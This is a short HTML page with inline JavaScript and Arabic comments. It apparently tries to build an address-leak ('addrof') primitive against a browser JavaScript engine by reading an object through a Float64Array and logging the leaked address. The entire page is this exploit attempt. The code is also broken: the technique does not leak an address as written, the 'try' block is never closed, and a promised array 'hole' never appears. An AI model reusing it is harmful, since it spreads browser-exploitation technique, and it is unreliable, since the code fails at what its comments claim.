    <div id="log">بدء العملية...</div>
<script>
    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

    try {
        // 1. إنشاء مصفوفة بها "فجوة" (Hole)
   // نستخدم مصفوفة كائنات ومصفوفة رقمية (Float64Array)
// الهدف: جعل المحرك يقرأ "عنوان الكائن" كـ "قيمة Double"
let obj = { a: 1 };
let arr = [obj];
let floatArr = new Float64Array(1);

function get_addr(obj) {
    // سنحاول وضع الكائن في مصفوفة، ثم قراءته من Float64Array
    // ليعامل المؤشر كـ 64-bit float
    arr[0] = obj;
    floatArr[0] = arr[0];
    
    // إذا نجح الخداع، سيعيد لنا عنوان الكائن كقيمة رقمية (Hex)
    return floatArr[0];
}

let leakedAddr = get_addr(obj);
log("العنوان المسرب (Address Leak): " + leakedAddr.toString(16));

</script>
